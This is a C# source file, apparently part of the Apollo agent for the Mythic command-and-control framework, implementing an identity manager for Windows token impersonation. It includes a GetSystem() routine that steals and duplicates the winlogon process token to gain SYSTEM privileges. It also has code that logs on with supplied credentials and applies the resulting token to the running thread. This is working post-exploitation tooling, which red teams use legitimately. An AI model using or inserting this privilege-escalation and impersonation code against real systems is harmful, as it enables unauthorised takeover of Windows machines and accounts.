﻿using ApolloInterop.Interfaces;
using ApolloInterop.Structs.ApolloStructs;
using System;
using System.Security.Principal;
using ApolloInterop.Classes.Api;
using static ApolloInterop.Enums.Win32;
using static ApolloInterop.Constants.Win32;
using System.Runtime.InteropServices;
using static ApolloInterop.Structs.Win32;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Utils;

namespace Apollo.Management.Identity;

public class IdentityManager : IIdentityManager
{
    private IAgent _agent;

    private ApolloLogonInformation _userCredential;
    private WindowsIdentity _originalIdentity = WindowsIdentity.GetCurrent();
    private WindowsIdentity _currentPrimaryIdentity = WindowsIdentity.GetCurrent();
    private WindowsIdentity _currentImpersonationIdentity = WindowsIdentity.GetCurrent();
    private bool _isImpersonating = false;

    private IntPtr _executingThread = IntPtr.Zero;
    private IntPtr _originalImpersonationToken = IntPtr.Zero;
    private IntPtr _originalPrimaryToken = IntPtr.Zero;

    #region Delegate Typedefs

    private delegate IntPtr GetCurrentThread();

    private delegate bool OpenThreadToken(
        IntPtr threadHandle,
        uint desiredAccess,
        bool openAsSelf,
        out IntPtr tokenHandle);

    private delegate bool OpenProcessToken(
        IntPtr hProcess,
        uint dwDesiredAccess,
        out IntPtr hToken);

    private delegate bool DuplicateTokenEx(
        IntPtr hToken,
        TokenAccessLevels dwDesiredAccess,
        IntPtr lpTokenAttributes,
        TokenImpersonationLevel impersonationLevel,
        TokenType tokenType,
        out IntPtr phNewToken);

    private delegate bool SetThreadToken(
        ref IntPtr hThread,
        IntPtr hToken);

    private delegate bool CloseHandle(
        IntPtr hHandle);

    private delegate bool GetTokenInformation(
        IntPtr tokenHandle,
        TokenInformationClass tokenInformationClass,
        IntPtr tokenInformation,
        int tokenInformationLength,
        out int returnLength);
    
    private delegate bool SetTokenInformation(
        IntPtr tokenHandle,
        TokenInformationClass tokenInformationClass,
        IntPtr tokenInformation,
        int tokenInformationLength);

    private delegate IntPtr GetSidSubAuthorityCount(IntPtr pSid);
    private delegate IntPtr GetSidSubAuthority(IntPtr pSid, int nSubAuthority);

    private delegate bool LogonUserA(
        string lpszUsername,
        string lpszDomain,
        string lpszPassword,
        LogonType dwLogonType,
        LogonProvider dwLogonProvider,
        out IntPtr phToken);
    //private delegate bool RevertToSelf();

    private GetCurrentThread _GetCurrentThread;
    private OpenThreadToken _OpenThreadToken;
    private OpenProcessToken _OpenProcessToken;
    private DuplicateTokenEx _DuplicateTokenEx;
    private SetThreadToken _SetThreadToken;
    private CloseHandle _CloseHandle;
    private GetTokenInformation _GetTokenInformation;
    private SetTokenInformation _SetTokenInformation;
    private GetSidSubAuthorityCount _GetSidSubAuthorityCount;
    private GetSidSubAuthority _GetSidSubAuthority;

    private LogonUserA _pLogonUserA;
    // private RevertToSelf _RevertToSelf;

    #endregion

    public IdentityManager(IAgent agent)
    {
        _agent = agent;

        _GetCurrentThread = _agent.GetApi().GetLibraryFunction<GetCurrentThread>(Library.KERNEL32, "GetCurrentThread");
        _OpenThreadToken = _agent.GetApi().GetLibraryFunction<OpenThreadToken>(Library.ADVAPI32, "OpenThreadToken");
        _OpenProcessToken = _agent.GetApi().GetLibraryFunction<OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
        _DuplicateTokenEx = _agent.GetApi().GetLibraryFunction<DuplicateTokenEx>(Library.ADVAPI32, "DuplicateTokenEx");
        //_RevertToSelf = _agent.GetApi().GetLibraryFunction<RevertToSelf>(Library.ADVAPI32, "RevertToSelf");
        _SetThreadToken = _agent.GetApi().GetLibraryFunction<SetThreadToken>(Library.ADVAPI32, "SetThreadToken");
        _CloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
        _GetTokenInformation = _agent.GetApi().GetLibraryFunction<GetTokenInformation>(Library.ADVAPI32, "GetTokenInformation");
        _SetTokenInformation = _agent.GetApi().GetLibraryFunction<SetTokenInformation>(Library.ADVAPI32, "SetTokenInformation");
        _GetSidSubAuthorityCount = _agent.GetApi().GetLibraryFunction<GetSidSubAuthorityCount>(Library.ADVAPI32, "GetSidSubAuthorityCount");
        _GetSidSubAuthority = _agent.GetApi().GetLibraryFunction<GetSidSubAuthority>(Library.ADVAPI32, "GetSidSubAuthority");
        _pLogonUserA = _agent.GetApi().GetLibraryFunction<LogonUserA>(Library.ADVAPI32, "LogonUserA");

        _executingThread = _GetCurrentThread();
        SetImpersonationToken();
        SetPrimaryToken();
    }

    private void SetPrimaryToken()
    {
        bool bRet = _OpenThreadToken(
            _executingThread,
            TOKEN_ALL_ACCESS,
            true,
            out _originalPrimaryToken);
        int dwError = Marshal.GetLastWin32Error();
        if (!bRet && Error.ERROR_NO_TOKEN == dwError)
        {
            IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
            bRet = _OpenProcessToken(
                hProcess,
                TOKEN_ALL_ACCESS,
                out _originalPrimaryToken);
        }
        else if (!bRet)
        {
            throw new Exception($"Failed to open thread token: {dwError}");
        }
        else
        {
            throw new Exception($"Failed to open thread token and have unhandled error. dwError: {dwError}");
        }
        if (_originalPrimaryToken == IntPtr.Zero)
            _originalPrimaryToken = WindowsIdentity.GetCurrent().Token;
    }

    public bool IsOriginalIdentity()
    {
        return !_isImpersonating;
    }
    public (bool,IntPtr) GetSystem()
    {
        if (GetIntegrityLevel() is IntegrityLevel.HighIntegrity)
        {
            IntPtr hToken = IntPtr.Zero;
            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName("winlogon");
            IntPtr handle = processes[0].Handle;

            bool success = _OpenProcessToken(handle, 0x0002, out hToken);
            if (!success)
            {
                DebugHelp.DebugWriteLine("[!] GetSystem() - OpenProcessToken failed!");
                return (false,new IntPtr());
            }
            IntPtr hDupToken = IntPtr.Zero;
            success = _DuplicateTokenEx(hToken, TokenAccessLevels.MaximumAllowed, IntPtr.Zero, TokenImpersonationLevel.Impersonation, TokenType.TokenImpersonation, out hDupToken);
            if (!success)
            {
                DebugHelp.DebugWriteLine("[!] GetSystem() - DuplicateToken failed!");
                return (false,new IntPtr());
            }
            DebugHelp.DebugWriteLine("[+] Got SYSTEM token!");
            return (true, hDupToken);
        }
        else
        {
            return (false,new IntPtr());
        }
    }

    public IntegrityLevel GetIntegrityLevel()
    {
        IntPtr hToken = _currentImpersonationIdentity.Token;
        int dwRet = 0;
        bool bRet = false;
        int dwTokenInfoLength = 0;
        IntPtr pTokenInformation = IntPtr.Zero;
        TokenMandatoryLevel tokenLabel;
        IntPtr pTokenLabel = IntPtr.Zero;
        IntPtr pSidSubAthorityCount = IntPtr.Zero;
        bRet = _GetTokenInformation(
            hToken,
            TokenInformationClass.TokenIntegrityLevel,
            IntPtr.Zero,
            0,
            out dwTokenInfoLength);
        if (dwTokenInfoLength == 0 || Marshal.GetLastWin32Error() != Error.ERROR_INSUFFICIENT_BUFFER)
            return (IntegrityLevel)dwRet;
        pTokenLabel = Marshal.AllocHGlobal(dwTokenInfoLength);
        try
        {
            bRet = _GetTokenInformation(
                hToken,
                TokenInformationClass.TokenIntegrityLevel,
                pTokenLabel,
                dwTokenInfoLength,
                out dwTokenInfoLength);
            if (bRet)
            {
                tokenLabel = (TokenMandatoryLevel)Marshal.PtrToStructure(pTokenLabel, typeof(TokenMandatoryLevel));
                pSidSubAthorityCount = _GetSidSubAuthorityCount(tokenLabel.Label.Sid);
                dwRet = Marshal.ReadInt32(_GetSidSubAuthority(tokenLabel.Label.Sid, Marshal.ReadInt32(pSidSubAthorityCount) - 1));
                if (dwRet < SECURITY_MANDATORY_LOW_RID)
                    dwRet = 0;
                else if (dwRet < SECURITY_MANDATORY_MEDIUM_RID)
                    dwRet = 1;
                else if (dwRet >= SECURITY_MANDATORY_MEDIUM_RID && dwRet < SECURITY_MANDATORY_HIGH_RID)
                    dwRet = 2;
                else if (dwRet >= SECURITY_MANDATORY_HIGH_RID && dwRet < SECURITY_MANDATORY_SYSTEM_RID)
                    dwRet = 3;
                else if (dwRet >= SECURITY_MANDATORY_SYSTEM_RID)
                    dwRet = 4;
                else
                    dwRet = 0; // unknown - should be unreachable.

            }
        }
        catch (Exception ex)
        { }
        finally
        {
            Marshal.FreeHGlobal(pTokenLabel);
        }
        return (IntegrityLevel)dwRet;
    }

    private void SetImpersonationToken()
    {
        bool bRet = _OpenThreadToken(
            _executingThread,
            TOKEN_ALL_ACCESS,
            true,
            out IntPtr hToken);
        int dwError = Marshal.GetLastWin32Error();
        if (!bRet && Error.ERROR_NO_TOKEN == dwError)
        {
            IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
            bRet = _OpenProcessToken(
                hProcess,
                TOKEN_ALL_ACCESS,
                out hToken);
            if (!bRet)
            {
                throw new Exception($"Failed to acquire Process token: {Marshal.GetLastWin32Error()}");
            }
            bRet = _DuplicateTokenEx(
                hToken,
                TokenAccessLevels.MaximumAllowed,
                IntPtr.Zero,
                TokenImpersonationLevel.Impersonation,
                TokenType.TokenImpersonation,
                out _originalImpersonationToken);

            if (!bRet)
            {
                throw new Exception($"Failed to acquire Process token: {Marshal.GetLastWin32Error()}");
            }
        }
        else if (!bRet)
        {
            throw new Exception($"Failed to open thread token: {dwError}");
        }

        if (_originalImpersonationToken == IntPtr.Zero)
        {
            _originalImpersonationToken = _originalIdentity.Token;
        }
    }

    public WindowsIdentity GetCurrent()
    {
        return _currentImpersonationIdentity;
    }

    public WindowsIdentity GetOriginal()
    {
        return _originalIdentity;
    }

    public bool SetIdentity(ApolloLogonInformation logonInfo)
    {
        bool bRet = false;
        int dwError = 0;
        IntPtr hToken = IntPtr.Zero;

        DebugHelp.DebugWriteLine($"[SetIdentity] Starting impersonation for {logonInfo.Domain}\\{logonInfo.Username}, NetOnly: {logonInfo.NetOnly}");
        
        // Log current identity before changes
        try 
        {
            var beforeIdentity = WindowsIdentity.GetCurrent();
            DebugHelp.DebugWriteLine($"[SetIdentity] Current identity before: {beforeIdentity.Name}");
            DebugHelp.DebugWriteLine($"[SetIdentity] _executingThread handle: 0x{_executingThread.ToInt64():X}");
        }
        catch (Exception ex)
        {
            DebugHelp.DebugWriteLine($"[SetIdentity] Error getting current identity: {ex.Message}");
        }

        Revert();
        // Blank out the old struct
        _userCredential = logonInfo;

        DebugHelp.DebugWriteLine($"[SetIdentity] Calling LogonUserA with:");
        DebugHelp.DebugWriteLine($"[SetIdentity]   Username: {_userCredential.Username}");
        DebugHelp.DebugWriteLine($"[SetIdentity]   Domain: {_userCredential.Domain}");
        DebugHelp.DebugWriteLine($"[SetIdentity]   LogonType: {(_userCredential.NetOnly ? "LOGON32_LOGON_NEW_CREDENTIALS" : "LOGON32_LOGON_INTERACTIVE")}");
        
        bRet = _pLogonUserA(
            _userCredential.Username,
            _userCredential.Domain,
            _userCredential.Password,
            _userCredential.NetOnly ? LogonType.LOGON32_LOGON_NEW_CREDENTIALS : LogonType.LOGON32_LOGON_INTERACTIVE,
            LogonProvider.LOGON32_PROVIDER_WINNT50,
            out hToken);

        if (!bRet)
        {
            dwError = Marshal.GetLastWin32Error();
            DebugHelp.DebugWriteLine($"[SetIdentity] LogonUserA failed with error: {dwError}");
            return false;
        }

        DebugHelp.DebugWriteLine($"[SetIdentity] LogonUserA succeeded, token handle: 0x{hToken.ToInt64():X}");
        
        _currentPrimaryIdentity = new WindowsIdentity(hToken);
        DebugHelp.DebugWriteLine($"[SetIdentity] Primary identity created: {_currentPrimaryIdentity.Name}");
        DebugHelp.DebugWriteLine($"[SetIdentity] Primary identity token: 0x{_currentPrimaryIdentity.Token.ToInt64():X}");
        
        _CloseHandle(hToken);
        DebugHelp.DebugWriteLine($"[SetIdentity] Closed original token handle");
        
        DebugHelp.DebugWriteLine($"[SetIdentity] Calling DuplicateTokenEx with:");
        DebugHelp.DebugWriteLine($"[SetIdentity]   Source token: 0x{_currentPrimaryIdentity.Token.ToInt64():X}");
        DebugHelp.DebugWriteLine($"[SetIdentity]   Desired access: MaximumAllowed");
        DebugHelp.DebugWriteLine($"[SetIdentity]   Impersonation level: Impersonation");
        
        bRet = _DuplicateTokenEx(
            _currentPrimaryIdentity.Token,
            TokenAccessLevels.MaximumAllowed,
            IntPtr.Zero,
            TokenImpersonationLevel.Impersonation,
            TokenType.TokenImpersonation,
            out IntPtr dupToken);
            
        if (!bRet)
        {
            dwError = Marshal.GetLastWin32Error();
            DebugHelp.DebugWriteLine($"[SetIdentity] DuplicateTokenEx failed with error: {dwError}");
            Revert();
            return false;
        }
        
        DebugHelp.DebugWriteLine($"[SetIdentity] DuplicateTokenEx succeeded, dupToken: 0x{dupToken.ToInt64():X}");
        
        // Create WindowsIdentity from the duplicated token BEFORE applying it or closing it
        // This ensures we have a valid token handle for later impersonation
        try
        {
            _currentImpersonationIdentity = new WindowsIdentity(dupToken);
            DebugHelp.DebugWriteLine($"[SetIdentity] Created WindowsIdentity from dupToken: {_currentImpersonationIdentity.Name}");
            DebugHelp.DebugWriteLine($"[SetIdentity] WindowsIdentity token handle: 0x{_currentImpersonationIdentity.Token.ToInt64():X}");
        }
        catch (Exception ex)
        {
            dwError = Marshal.GetLastWin32Error();
            DebugHelp.DebugWriteLine($"[SetIdentity] Failed to create WindowsIdentity from dupToken: {ex.Message}");
            _CloseHandle(dupToken);
            Revert();
            return false;
        }
        
        // Apply the impersonation token to the current thread
        DebugHelp.DebugWriteLine($"[SetIdentity] Calling SetThreadToken with thread: 0x{_executingThread.ToInt64():X}, token: 0x{dupToken.ToInt64():X}");
        bRet = _SetThreadToken(ref _executingThread, dupToken);
        
        if (!bRet)
        {
            dwError = Marshal.GetLastWin32Error();
            DebugHelp.DebugWriteLine($"[SetIdentity] SetThreadToken failed with error: {dwError}");
            _currentImpersonationIdentity.Dispose();
            _currentImpersonationIdentity = _originalIdentity;
            _CloseHandle(dupToken);
            Revert();
            return false;
        }
        
        DebugHelp.DebugWriteLine($"[SetIdentity] SetThreadToken succeeded");
        // Don't close dupToken here - WindowsIdentity now owns it
        DebugHelp.DebugWriteLine($"[SetIdentity] Token handle is now managed by WindowsIdentity");
        
        // Log the impersonation details
        try
        {
            DebugHelp.DebugWriteLine($"[SetIdentity] Current identity after impersonation: {_currentImpersonationIdentity.Name}");
            DebugHelp.DebugWriteLine($"[SetIdentity] Is authenticated: {_currentImpersonationIdentity.IsAuthenticated}");
            DebugHelp.DebugWriteLine($"[SetIdentity] Authentication type: {_currentImpersonationIdentity.AuthenticationType}");
        }
        catch (Exception ex)
        {
            DebugHelp.DebugWriteLine($"[SetIdentity] Error logging identity details: {ex.Message}");
        }
        
        _isImpersonating = true;
        DebugHelp.DebugWriteLine($"[SetIdentity] Impersonation complete, returning true");
        return true;
    }

    public void SetPrimaryIdentity(WindowsIdentity ident)
    {
        _currentPrimaryIdentity = ident;
        _isImpersonating = true;
    }

    public void SetPrimaryIdentity(IntPtr hToken)
    {
        _currentPrimaryIdentity = new WindowsIdentity(hToken);
        _isImpersonating = true;
    }

    public void SetImpersonationIdentity(WindowsIdentity ident)
    {
        _currentImpersonationIdentity = ident;
        _isImpersonating = true;
    }

    public void SetImpersonationIdentity(IntPtr hToken)
    {
        _currentImpersonationIdentity = new WindowsIdentity(hToken);
        _isImpersonating = true;
    }

    public void Revert()
    {
        _SetThreadToken(ref _executingThread, _originalImpersonationToken);
        _userCredential = new ApolloLogonInformation();
        
        // Dispose of the impersonation identity if it's not the original
        if (_currentImpersonationIdentity != _originalIdentity && _currentImpersonationIdentity != null)
        {
            try
            {
                _currentImpersonationIdentity.Dispose();
            }
            catch { }
        }
        
        _currentImpersonationIdentity = _originalIdentity;
        _currentPrimaryIdentity = _originalIdentity;
        _isImpersonating = false;
        //_RevertToSelf();
    }

    public WindowsIdentity GetCurrentPrimaryIdentity()
    {
        return _currentPrimaryIdentity;
    }

    public WindowsIdentity GetCurrentImpersonationIdentity()
    {
        return _currentImpersonationIdentity;
    }

    public bool GetCurrentLogonInformation(out ApolloLogonInformation logonInfo)
    {
        if (!string.IsNullOrEmpty(_userCredential.Username) &&
            !string.IsNullOrEmpty(_userCredential.Password))
        {
            logonInfo = _userCredential;
            return true;
        }
        logonInfo = new ApolloLogonInformation();
        return false;
    }

    
}